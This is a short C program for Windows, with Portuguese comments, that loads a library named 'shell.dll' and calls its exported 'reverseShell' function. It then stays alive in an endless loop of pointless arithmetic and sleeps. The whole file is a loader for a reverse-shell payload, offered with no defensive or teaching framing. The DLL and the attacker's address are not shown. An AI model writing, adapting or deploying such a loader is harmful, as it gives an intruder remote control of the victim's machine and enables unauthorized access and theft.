#include <stdio.h>
#include <windows.h>

// Prototipo da função da DLL
typedef void (*ReverseShellFunc)();

int main() {
    HINSTANCE hDLL;
    ReverseShellFunc reverseShell;

    // Carregar a DLL
    hDLL = LoadLibrary("shell.dll");
    if (hDLL == NULL) {
        return 1;
    }

    // Obter o endereço da função da DLL
    reverseShell = (ReverseShellFunc)GetProcAddress(hDLL, "reverseShell");
    if (reverseShell == NULL) {
        FreeLibrary(hDLL);
        return 1;
    }

    // Executar a função da DLL (shell reverso)
    reverseShell();

    // Manter o programa ativo em um loop infinito
    while (1) {
        // Realizar algumas operações para continuar em execução
        int a = 1425, b = 7;
        int soma = a + b;
        int subtracao = a - b;
        int multiplicacao = a * b;
        double divisao = (double)a / b;

       
        Sleep(5000); // Esperar 5 segundos antes de repetir o loop
    }

    // Nunca alcançamos este ponto, mas para completar, liberamos a DLL
    FreeLibrary(hDLL);

    return 0;
}
